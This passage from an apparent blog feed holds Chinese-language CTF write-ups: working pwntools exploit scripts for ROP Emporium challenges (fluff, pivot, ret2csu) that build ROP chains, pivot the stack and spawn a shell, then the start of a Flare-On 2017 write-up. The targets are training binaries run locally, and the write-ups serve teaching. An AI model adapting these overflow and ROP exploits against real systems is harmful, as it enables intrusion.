class="line">pause()</span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay +=<span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay +=p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">pay +=p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>emmm 这个 纯粹调用gadget完成的任务</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write4 [15:14:52] C:1</span></span><br><span class="line">$ cat ../fluff32/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket, time, struct, binascii</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span>():</span></span><br><span class="line">  HEADER = <span class="string">&#x27;\033[95m&#x27;</span></span><br><span class="line">  OKBLUE = <span class="string">&#x27;\033[94m&#x27;</span></span><br><span class="line">  OKGREEN = <span class="string">&#x27;\033[92m&#x27;</span></span><br><span class="line">  WARNING = <span class="string">&#x27;\033[93m&#x27;</span></span><br><span class="line">  FAIL = <span class="string">&#x27;\033[91m&#x27;</span></span><br><span class="line">  ENDC = <span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line">  BOLD = <span class="string">&#x27;\033[1m&#x27;</span></span><br><span class="line">  UNDERLINE = <span class="string">&#x27;\033[4m&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ip=None, port=None, length=<span class="number">0xFFFF</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip <span class="keyword">or</span> <span class="keyword">not</span> port:</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    self.socket.connect((ip, port))</span><br><span class="line">    self.length = length</span><br><span class="line">    self.rop = <span class="literal">None</span></span><br><span class="line">    self.receive = <span class="literal">None</span></span><br><span class="line">    self.log(<span class="string">&#x27;Connected to target&#x27;</span>)</span><br><span class="line">    self.line = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">iprocess</span>(<span class="params">elf</span>):</span></span><br><span class="line">  io = process(elf)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, payload=None</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload <span class="keyword">and</span> self.rop:</span><br><span class="line">      payload = self.rop</span><br><span class="line">    <span class="keyword">if</span> self.line:</span><br><span class="line">      payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">      self.line = <span class="literal">False</span></span><br><span class="line">    self.socket.send(payload)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sendline</span>(<span class="params">self, payload=None</span>):</span></span><br><span class="line">    self.line = <span class="literal">True</span></span><br><span class="line">    self.send(payload)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, l=None</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> l:</span><br><span class="line">      l = self.length</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    self.receive = self.socket.recv(l)</span><br><span class="line">    <span class="keyword">return</span> self.receive</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">create_rop</span>(<span class="params">self, offset, gadgets</span>):</span></span><br><span class="line">      p = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">      self.log(<span class="string">&#x27;Creating ROP Chain&#x27;</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">      <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        <span class="keyword">if</span> isinstance(gadget, (int, long)) <span class="keyword">and</span> hex(gadget).startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">          p += self.p(gadget)</span><br><span class="line">          <span class="keyword">print</span> <span class="string">&#x27;    &#x27;</span>,hex(gadget)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          p += gadget</span><br><span class="line">          <span class="keyword">print</span> <span class="string">&#x27;    &#x27;</span>,gadget</span><br><span class="line">      self.rop = p</span><br><span class="line">      <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">recv_until</span>(<span class="params">self, string</span>):</span></span><br><span class="line">    buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      x = self.socket.recv(<span class="number">1024</span>)</span><br><span class="line">      buff += x</span><br><span class="line">      <span class="keyword">if</span> x.strip() == string:</span><br><span class="line">        <span class="keyword">return</span> buff</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">self, a, t=None</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t:</span><br><span class="line">      t = self.OKBLUE + <span class="string">&#x27;+&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> t == <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">      t = self.HEADER + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> t == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      t = self.WARNING + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> t == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">      t = self.FAIL + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    t  =  self.OKGREEN + <span class="string">&#x27;[&#x27;</span> + t + self.OKGREEN + <span class="string">&#x27;]&#x27;</span> + self.ENDC</span><br><span class="line">    print(t + <span class="string">&#x27; %s&#x27;</span> % (a))</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">funcs</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">    raw = raw.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    t_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> raw:</span><br><span class="line">      f = f.split()</span><br><span class="line">      f_name = f[<span class="number">1</span>].replace(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">      f_addr = f[<span class="number">0</span>]</span><br><span class="line">      t_dict[f_name] = int(f_addr, <span class="number">16</span>)</span><br><span class="line">      globals()[f_name] = int(f_addr,<span class="number">16</span>)</span><br><span class="line">    self.functions = t_dict</span><br><span class="line">    <span class="keyword">return</span> self.functions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">p</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;pack raw packets&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">u</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;unpack raw packets&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;L&#x27;</span>, addr)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">hexdump</span>(<span class="params">self, data=None, bytez=<span class="number">0</span></span>):</span></span><br><span class="line">    info_msg = <span class="string">&quot;\t\t-------&gt;Hex Dump&lt;-------&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">      data = self.recv()</span><br><span class="line">      info_msg = <span class="string">&#x27;Hex Dump for last receive\n&#x27;</span></span><br><span class="line">    self.log(info_msg)</span><br><span class="line">    ndata = binascii.hexlify(data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n&quot;</span></span><br><span class="line">    ndata = list(self.chunks(ndata[:<span class="number">320</span>],<span class="number">32</span>))</span><br><span class="line">    offset = bytez</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> ndata:</span><br><span class="line">      x = <span class="string">&#x27; &#x27;</span>.join(each[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(each), <span class="number">2</span>))</span><br><span class="line">      printspace = <span class="string">&quot; &quot;</span>*(<span class="number">10</span>-len(hex(offset)))</span><br><span class="line">      <span class="keyword">print</span> hex(offset) + printspace + x</span><br><span class="line">      offset += <span class="number">16</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">chunks</span>(<span class="params">self, l, n</span>):</span></span><br><span class="line">    n = max(<span class="number">1</span>, n)</span><br><span class="line">    <span class="keyword">return</span> (l[i:i+n] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(l), n))</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">interactive</span>(<span class="params">self, tty=None</span>):</span></span><br><span class="line">    telnet = telnetlib.Telnet()</span><br><span class="line">    telnet.sock = self.socket</span><br><span class="line">    self.log(<span class="string">&#x27;Switching to interactive session\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> tty:</span><br><span class="line">      telnet.write(<span class="string">&#x27;python -c &quot;import pty;pty.spawn(\&#x27;/bin/sh\&#x27;)&quot;\n&#x27;</span>)</span><br><span class="line">    telnet.interact()</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">write_payload</span>(<span class="params">self, file_name=None, payload=None</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:</span><br><span class="line">      file_name = <span class="string">&#x27;payload&#x27;</span></span><br><span class="line">    self.log(<span class="string">&#x27;Writing payload to file : &#x27;</span> + file_name)</span><br><span class="line">    f = open(file_name, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">addresses = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x08048400  printf@plt</span></span><br><span class="line"><span class="string">0x08048410  fgets@plt</span></span><br><span class="line"><span class="string">0x08048420  puts@plt</span></span><br><span class="line"><span class="string">0x08048430  system@plt</span></span><br><span class="line"><span class="string">0x0804857b  main</span></span><br><span class="line"><span class="string">0x080485f6  pwnme</span></span><br><span class="line"><span class="string">0x0804864c  usefulFunction</span></span><br><span class="line"><span class="string">0x08048670  questionableGadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">xor_edx_edx   = <span class="number">0x8048671</span></span><br><span class="line">pop_ebx       = <span class="number">0x8048696</span></span><br><span class="line">xor_edx_ebx   = <span class="number">0x804867b</span></span><br><span class="line">xchg_edx_ecx  = <span class="number">0x8048689</span></span><br><span class="line">mov_ecx_edx   = <span class="number">0x8048693</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer_x      = <span class="number">0x804a028</span></span><br><span class="line"></span><br><span class="line">PADDING_4     = <span class="string">&#x27;P&#x27;</span>*<span class="number">4</span></span><br><span class="line">PADDING_8     = <span class="string">&#x27;P&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BIN   = <span class="string">&#x27;\x53bin&#x27;</span></span><br><span class="line">SH    = <span class="string">&#x27;\x7fsh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = Target(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#target = process(&quot;./fluff32&quot;)</span></span><br><span class="line">target.funcs(addresses)</span><br><span class="line">target.create_rop(<span class="number">44</span>, [ xor_edx_edx, PADDING_4, pop_ebx, buffer_x, xor_edx_ebx, PADDING_4, xchg_edx_ecx,</span><br><span class="line">                        PADDING_4, xor_edx_edx, PADDING_4, pop_ebx, BIN, xor_edx_ebx, PADDING_4, mov_ecx_edx, PADDING_8,</span><br><span class="line">                        xor_edx_edx, PADDING_4, pop_ebx, buffer_x+<span class="number">4</span>, xor_edx_ebx, PADDING_4, xchg_edx_ecx,</span><br><span class="line">                        PADDING_4, xor_edx_edx, PADDING_4, pop_ebx, SH, xor_edx_ebx, PADDING_4, mov_ecx_edx, PADDING_8,</span><br><span class="line">                        system_plt, PADDING_4, buffer_x])</span><br><span class="line">target.log(<span class="string">&#x27;Sending ROP Chain&#x27;</span>)</span><br><span class="line">target.sendline()</span><br><span class="line">target.recv()</span><br><span class="line">target.interactive(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这里的问题是堆栈上可用的空间很小，我们在返回指针后只有13bytes分配给堆栈。这意味着我们必须找到一个方法来到更多的空间。我们知道，由于ASLR，我们不能只使用堆栈地址来实现，而没有任何内存泄漏。此外，我们可以看到，我们的有效负载覆盖了EBP  ，二进制文件给出了一些地址值。首先让我们看看我们所有的AAAA的地址，然后我们可以进一步确认 我的第一次输入的地址，</p><p>所以我们可以构造一次 覆盖ebp，然后返回到我们第一次输入的地方，去get flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/pivot32 [15:16:18]</span></span><br><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x804889e</span></span><br><span class="line">leakaddr  = int(io.recv().split()[<span class="number">20</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leakaddr: 0x%x&quot;</span> % leakaddr)</span><br><span class="line">base_addr = leakaddr + <span class="number">0x1d90f8</span>         <span class="comment"># 0xb7fd1000 - 0xb7df7f08 = 0x1d90f8  (0xf7df7000 - 0xf7df5f08)</span></span><br><span class="line">ret_win_addr = base_addr + <span class="number">0x967</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;base addr:0x%x&quot;</span> % base_addr)</span><br><span class="line">log.info(<span class="string">&quot;ret_win_addr: 0x%x&quot;</span> % ret_win_addr)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += p32(foothold_function_plt)</span><br><span class="line">pay += p32(ret_win_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">pay =  <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(leakaddr)</span><br><span class="line">pay += p32(leave_ret)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#flag = io.recvline()</span></span><br><span class="line"><span class="comment">#print flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;ret2csu&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;ret2csu&#x27;</span>)</span><br><span class="line">csu_front_addr=<span class="number">0x400880</span></span><br><span class="line">csu_end_addr=<span class="number">0x40089a</span></span><br><span class="line">ret2win = <span class="number">0x4007b1</span></span><br><span class="line">init_pointer= <span class="number">0x0600E10</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,init_pointer,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xdeadcafebabebeef</span>,ret2win)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ropemporium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flare on writeup 2017 writeup</title>
      <link href="2017-flare-on-write-up.html"/>
      <url>2017-flare-on-write-up.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Flareon是主要题目为逆向的一场CTF比赛，已经是第四届了，比赛时间一个月左右。<br>这是第一次参加这个比赛，今年没拿到牌子，明年再战！</p><div align=center>https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-flare-on-result.jpg</div><h2 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13"></a>ROT13</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       